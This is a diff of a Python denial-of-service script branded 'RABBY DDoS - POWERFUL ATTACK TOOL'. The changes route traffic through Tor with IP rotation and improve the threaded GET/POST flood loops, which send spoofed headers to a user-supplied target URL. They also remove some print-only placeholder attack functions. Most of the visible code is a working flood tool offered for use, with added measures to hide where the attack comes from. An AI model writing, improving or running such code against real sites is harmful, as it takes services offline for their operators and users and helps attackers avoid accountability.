@@ -3,10 +3,25 @@ import random
 import time
 import threading
 import os
+import socks
+import socket
+from stem.control import Controller
+from stem import Signal
 from colorama import Fore, Style, init
 
 # Initialize Colorama for colored outputs
 init(autoreset=True)
+
+# Function to Show Banner
+def show_banner():
+    os.system("cls" if os.name == "nt" else "clear")
+    print(Fore.MAGENTA + "="*60)
+    print(Fore.CYAN + "🔥🔥🔥  RABBY DDoS - POWERFUL ATTACK TOOL  🔥🔥🔥" + Style.RESET_ALL)
+    print(Fore.YELLOW + "          Created by Rabby" + Style.RESET_ALL)
+    print(Fore.MAGENTA + "="*60 + "\n")
+
+# Call the Banner Function
+show_banner()
 
 # Randomized User-Agents for spoofing
 user_agents = [
@@ -18,6 +33,20 @@ user_agents = [
 
 # Color Setup
 colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
+
+# TOR Proxy Setup
+def set_tor_proxy():
+    socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+    socket.socket = socks.socksocket
+
+# Change TOR IP
+def change_tor_ip():
+    try:
+        with Controller.from_port(port=9051) as controller:
+            controller.authenticate(password="your_password_here")  # Change this if needed
+            controller.signal(Signal.NEWNYM)
+    except Exception as e:
+        print(Fore.RED + f"[!] TOR IP Change Failed: {e}")
 
 # Load Balancer Bypass Function (Header Manipulation & Random IP)
 def load_balancer_bypass_headers():
@@ -33,32 +62,14 @@ def load_balancer_bypass_headers():
     }
     return headers
 
-# Amplification Attack (DNS & UDP)
-def amplification_attack(url, attack_type):
-    if attack_type == "UDP":
-        print(Fore.MAGENTA + "[UDP Amplification] Attack Sent!")
-    elif attack_type == "DNS":
-        print(Fore.CYAN + "[DNS Amplification] Attack Sent!")
-    else:
-        print(Fore.RED + "[Amplification Attack] Invalid Type")
-
-# Multi-Layered Attack (L4 + L7)
-def multi_layered_attack(url, attack_type):
-    if attack_type == "L4":
-        print(Fore.GREEN + "[L4 (TCP/UDP Flood)] Attack Sent!")
-    elif attack_type == "L7":
-        print(Fore.YELLOW + "[L7 (HTTP Flood)] Attack Sent!")
-    else:
-        print(Fore.RED + "[Multi-Layered Attack] Invalid Layer Type")
-
 # GET Attack Function with Load Balancer Bypass
 def get_attack_with_bypass(url):
     while True:
         try:
             headers = load_balancer_bypass_headers()
-            response = requests.get(url, headers=headers)
+            response = requests.get(url, headers=headers, timeout=5)
             print(random.choice(colors) + f"[GET] Attack Sent! Status: {response.status_code}")
-        except Exception as e:
+        except requests.exceptions.RequestException as e:
             print(Fore.RED + f"Error: {e}")
 
 # POST Attack Function with Load Balancer Bypass
@@ -67,9 +78,9 @@ def post_attack_with_bypass(url):
         try:
             headers = load_balancer_bypass_headers()
             data = {"data": "attack"}
-            response = requests.post(url, headers=headers, data=data)
+            response = requests.post(url, headers=headers, data=data, timeout=5)
             print(random.choice(colors) + f"[POST] Attack Sent! Status: {response.status_code}")
-        except Exception as e:
+        except requests.exceptions.RequestException as e:
             print(Fore.RED + f"Error: {e}")
 
 # Distributed Attack (Multiple IPs)
@@ -101,11 +112,10 @@ def high_performance_attack(url, attack_type, thread_count):
         t.join()
 
 # Function to start the attack
-def start_attack(url, attack_type, thread_count, multi_layered, amplification_type, attack_duration):
-    if multi_layered:
-        multi_layered_attack(url, attack_type)
-    if amplification_type:
-        amplification_attack(url, amplification_type)
+def start_attack(url, attack_type, thread_count, attack_duration):
+    set_tor_proxy()  # Activate TOR Proxy
+    print(Fore.MAGENTA + "\n🔥 Attack Started... 🔥" + Style.RESET_ALL)
+    
     distributed_attack(url, attack_type, thread_count)
 
     if attack_duration:
@@ -114,26 +124,12 @@ def start_attack(url, attack_type, thread_count, multi_layered, amplification_ty
         print(Fore.MAGENTA + "\n🔥 Attack Ended... 🔥" + Style.RESET_ALL)
 
 # User Input and UI Display
-def show_ui():
-    os.system("cls" if os.name == "nt" else "clear")
-    print("="*50)
-    print(Fore.CYAN + "    ADVANCED DDoS ATTACK TOOL" + Style.RESET_ALL)
-    print(Fore.YELLOW + "     Created by Rabby" + Style.RESET_ALL)
-    print("="*50 + "\n")
-    time.sleep(1)
-
 if __name__ == "__main__":
-    show_ui()
-
     url = input(Fore.CYAN + "Enter Target URL (http:// or https://): " + Style.RESET_ALL)
     attack_type = input(Fore.YELLOW + "Choose Attack Method (GET/POST): " + Style.RESET_ALL).upper()
     thread_count = int(input(Fore.GREEN + "Enter Number of Threads: " + Style.RESET_ALL))
-    multi_layered = input(Fore.MAGENTA + "Enable Multi-Layered Attack? (L4/L7): " + Style.RESET_ALL).upper()
-    amplification_type = input(Fore.CYAN + "Enable Amplification Attack? (DNS/UDP): " + Style.RESET_ALL).upper()
     attack_duration_input = input(Fore.MAGENTA + "Enter Attack Duration in seconds (Leave empty for indefinite): " + Style.RESET_ALL)
 
     attack_duration = int(attack_duration_input) if attack_duration_input else None  # Make time optional
 
-    print(Fore.MAGENTA + "\n🔥 Attack Started... 🔥" + Style.RESET_ALL)
-    time.sleep(2)
-    start_attack(url, attack_type, thread_count, multi_layered, amplification_type, attack_duration)
+    start_attack(url, attack_type, thread_count, attack_duration)
